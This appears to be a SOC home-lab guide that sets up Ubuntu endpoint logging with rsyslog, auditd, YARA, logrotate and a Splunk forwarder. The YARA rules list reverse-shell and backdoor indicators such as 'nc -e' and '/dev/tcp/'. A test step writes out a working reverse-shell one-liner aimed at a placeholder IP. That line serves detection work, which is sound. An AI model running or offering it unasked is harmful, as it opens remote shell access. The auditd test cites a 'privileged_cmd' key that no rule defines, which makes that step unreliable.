## Overview

The Ubuntu operating system already logs many processes and events. In this SOC lab, we will forward only the following to the SIEM:
- /var/log/auth.log	for SSH, sudo and authentication
- /var/log/syslog for system events

Run `$ systemctl status systemd-journald` to check whether system logs are being collected.

## Rsyslog

Rsyslog is used to centralize system logs, filter events and write logs in dedicated files.

First we have to install rsyslog:
```
$ sudo apt update
$ sudo apt install rsyslog
$ systemctl status rsyslog
```

Next we need to create the configuration files.

- For SSH, create the /etc/rsyslog.d/10-sshd.conf file:
```
if $programname == 'sshd' then /var/log/sshd.log
& stop
```
Any action with the program name `sshd` will be logged in the /var/log/sshd.log file.

- For the bash history, update the /etc/profile.d/cmdlog.sh by adding:
```
export PROMPT_COMMAND='
history -a
CMD=$(fc -ln -1)
logger -p local1.notice -- "USER=$(whoami) PWD=$(pwd) CMD=$CMD"
'
```
`fc -ln -1` reads the last entry from the shell history. Each command is sent to syslog using the local1.notice priority.

Then, create the file /etc/rsyslog.d/20-bash.conf:
```
local1.*    /var/log/bash_cmds.log
```
With this, local1 logs are written to the log file. Finally, run `$ source /etc/profile` to apply the modifications from /etc/profile.d/cmdlog.sh. 

- For sudo, create the /etc/rsyslog.d/30-sudo.conf file:
```
if $programname == 'sudo' then /var/log/sudo.log
& stop
```

To check whether the rsyslog rules are correct, use : 
`$ sudo rsyslogd -N1`.
Then restart the service with `$ sudo systemctl restart rsyslog`


In order to verify that rsyslog is working as intended, we can run any bash command and check the /var/log/bash_cmds.log file to see if it gets logged. Same thing to check the sudo configuration, run a sudo command and check the /var/log/sudo.log file. For the ssh logs, install an ssh server with:
```
$ sudo apt install openssh-server
$ sudo systemctl enable --now ssh
$ systemctl status ssh
```
Then start an ssh connection with `ssh localhost` and check the /var/log/sshd.log file.



## Auditd

Auditd installation:
```
$ sudo apt install auditd audispd-plugins
$ systemctl status auditd
```

In this context, auditd will be used to log:
- any changes made to sudoers file or sudoers.d folder, which could allow unauthorized users to execute commands with root privileges if modified
- any changes made to the /etc/passwd or /etc/shadow files, which can be used to change permissions or add users
- execution of privileged commands, this includes sudo, suid, programs with uid set to 0, etc
- file deletion, this could be an attempt to destroy evidence of the attack, or disable security controls
- hostname changes, which could lead to confusion in the logs if a change occurred during an attack without being monitored
- any group changes, which can lead to permission abuse
- any cron changes, which could indicate that an attacker is attempting to establish persistence
- changes in the services available, which could be used to achieve persistence as well

We create auditd rules in the file /etc/audit/rules.d/soc.rules :
```
# sudoers
-w /etc/sudoers -p wa -k sudoers_change
-w /etc/sudoers.d/ -p wa -k sudoers_change
# privilege escalation, user creation or modification
-w /etc/passwd -p wa -k passwd_change
-w /etc/shadow -p wa -k shadow_change
# ssh
-w /etc/ssh/sshd_config -p wa -k ssh_change
# all commands
-a always,exit -F arch=b64 -S execve -k execve
-a always,exit -F arch=b32 -S execve -k execve
# file deletion
-a always,exit -F arch=b64 -S unlink -k file_delete
-a always,exit -F arch=b32 -S unlink  -k file_delete
-a always,exit -F arch=b64 -S unlinkat -k file_delete
-a always,exit -F arch=b32 -S unlinkat -k file_delete
# hostname change -> un attaquant peut changer le nom pour créer de la confusion dans les logs
-a always,exit -F arch=b64 -S sethostname -k hostname_change
-a always,exit -F arch=b32 -S sethostname -k hostname_change
# group change
-w /etc/group -p wa -k group_change
# cron change
-w /etc/crontab -p wa -k cron_change
-w /etc/cron.d/ -p wa -k cron_change
# systemd
-w /etc/systemd/system -p wa -k systemd_change
```

Apply the rules:
```
$ sudo augenrules --load
$ sudo auditctl -l
```

To test the auditd configuration, we can run commands that will trigger the rules, such as a privileged command for instance. Then use `$ ausearch -k privileged_cmd` to verify that the action was logged. The auditd logs are in the /var/log/audit/audit.log file.

## YARA

YARA is installed with `$ sudo apt install yara -y`. Once the installation is complete, check the version with `$ yara --version`. At the moment of this lab setup, the version is 4.1.3.

Two YARA rules are added, in order to detect bash reverse shells and python backdoors.
The file `/opt/yara/rules/rev_shell.yar` contains the rule to detect reverse shells:
```
rule Linux_Reverse_Shell_Indicators
{
    meta:
        description = "Detects linux reverse shell indicators"
	    date = "2026-06-24"
    strings:
        $s1 = "/dev/tcp/"
        $s2 = "bash -i"
        $s3 = "0>&1"
        $s4 = "nc -e"
        $s5 = "socket.socket"
        $s6 = "subprocess.call"
    condition:
        2 of them
}
```

The file `/opt/yara/rules/python_backdoor.yar` contains the rule to detect python backdoors:

```
rule Python_Backdoor_Indicators
{
    meta:
        description = "Detects python backdoor"
	    date = "2026-06-24"
    strings:
        $s1 = "import socket"
        $s2 = "import subprocess"
        $s3 = "import os"
        $s4 = "subprocess.Popen"
        $s5 = "connect("
        $s6 = "/bin/bash"
    condition:
        3 of them
}
```

YARA is triggered by a cron job through the script `/usr/local/bin/yara-scan.sh`, which runs both rules against all files from /home directory and writes any matches to a log file. The log file is created with:
```
$ sudo mkdir -p /var/log/yara
$ sudo chown root:root /var/log/yara
```

The content of the script is as follows:
```
#!/bin/bash

DATE=$(date +%F_%H-%M)
LOG_FILE="/var/log/yara/yara-$DATE.log"

yara -r /opt/yara/rules/*.yar /home > "$LOG_FILE"

if [ ! -s "$LOG_FILE" ]; then
    rm -f "$LOG_FILE"
fi
```

After making the script `yara-scan.sh` executable, we can add the execution to `/etc/crontab`, the frequency will be once an hour:
```
0 * * * * root /usr/local/bin/yara-scan.sh
```

Then restart cron to apply the changes: `$ sudo systemctl restart cron`.


To verify that the YARA detection is working, create a rev_test.sh file containing the following reverse shell: `sh -i >& /dev/tcp/10.10.10.10/9001 0>&1`, in the `/home/charlie/Downloads` directory. Wait for the yara-scan.sh script to execute, once done there should be a log file in the directory `/var/log/yara` containing the message `Linux_Reverse_Shell_Indicators /home/charlie/Downloads/rev_test.sh`


## Logrotate

Logrotate is used to determine how log files are handled, how often they are deleted or archived.

Logrotate can be installed with `$ sudo apt install logrotate`

For the configuration, we will use the following options:
- daily: the files will be rotated on a daily basis
- rotate 30: archives are kept for 30 days
- compress: archived logs are compressed
- missingok: no error if the log file does not exist
- notifempty: no rotation if the log file is empty

For SSH logs, create the file /etc/logrotate.d/sshd with the following content:
```
/var/log/sshd.log {
    daily
    rotate 30
    compress
    missingok
    notifempty
}
```

For bash history logs, create the file /etc/logrotate.d/bash_commands with the following content:
```
/var/log/bash_cmds.log {
    daily
    rotate 30
    compress
    missingok
    notifempty
}
```

For sudo logs, create the file /etc/logrotate.d/sudo with the following content:
```
/var/log/sudo.log {
    daily
    rotate 30
    compress
    missingok
    notifempty
}
```

Apply the logrotate configuration:
`$ sudo logrotate -d /etc/logrotate.conf`

The auditd logs rotation is handled by auditd itself. This can be checked in the /etc/audit/auditd.conf file with the parameter: `max_log_file_action = ROTATE`.


## Splunk Forwarder

The universal splunk forwarder has to be downloaded from the Splunk website.

The installation and configuration of the splunk forwarder requires the following steps:
```
$ sudo dpkg -i splunkforwarder*.deb
$ sudo /opt/splunkforwarder/bin/splunk start --accept-license
$ sudo /opt/splunkforwarder/bin/splunk add forward-server 192.168.1.52:9997
```

Create the file /opt/splunkforwarder/etc/system/local/inputs.conf with the following content, to specify which logs will be forwarded to Splunk:

```
[monitor:///var/log/auth.log]
index=linux_os
sourcetype=linux_auth

[monitor:///var/log/syslog]
index=linux_os
sourcetype=syslog

[monitor:///var/log/sshd.log]
index=linux_os
sourcetype=sshd

[monitor:///var/log/bash_cmds.log]
index=linux_os
sourcetype=bash_history

[monitor:///var/log/sudo.log]
index=linux_os
sourcetype=sudo

[monitor:///var/log/audit/audit.log]
index=linux_os
sourcetype=linux_audit

[monitor:///var/log/yara]
index = linux_os
sourcetype = yara
recursive = false
```

Then restart the splunk forwarder:
`$ sudo /opt/splunkforwarder/bin/splunk restart`

And view the current forwarder:
`$ sudo /opt/splunkforwarder/bin/splunk list forward-server`

The output shows that the installation was successful:
```
Active forwards:
    192.168.1.52:9997
```

To verify that the logs are accessible in Splunk, we use the Splunk instance configured in the SIEM setup section of this repository.
Any new event generated on the Ubuntu endpoint should now be forwarded to Splunk and be searchable through the dashboard, with the index linux_os.